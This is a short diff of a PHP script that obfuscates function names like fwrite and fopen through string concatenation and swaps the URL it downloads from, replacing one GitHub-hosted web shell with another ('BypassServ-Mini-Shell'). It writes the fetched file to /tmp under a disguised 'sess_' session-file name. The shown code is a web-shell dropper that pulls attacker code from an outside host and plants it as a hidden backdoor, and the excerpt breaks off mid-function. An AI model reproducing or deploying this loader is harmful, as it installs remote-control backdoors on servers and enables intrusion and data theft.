@@ -4,8 +4,8 @@ $fw = "f" . "w" . "r" . "i" . "t" . "e";
 $fo = "f" . "o" . "p" . "e" . "n";
 $fc = "f" . "c" . "l" . "o" . "s" . "e";
 
-$tmpfile = 'sess_' . md5('naxtarrr') . '.php';
-$data = ['https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/nax-shell-v2.php', "/tmp/$tmpfile"];
+$tmpfile = 'sess_' . md5('nax') . '.php';
+$data = ['https://raw.githubusercontent.com/im-hanzou/BypassServ-Mini-Shell/main/bypasserv-new.php', "/tmp/$tmpfile"];
 
 if (!file_exists($data[1]) || filesize($data[1]) === 0) {
     $context = stream_context_create([
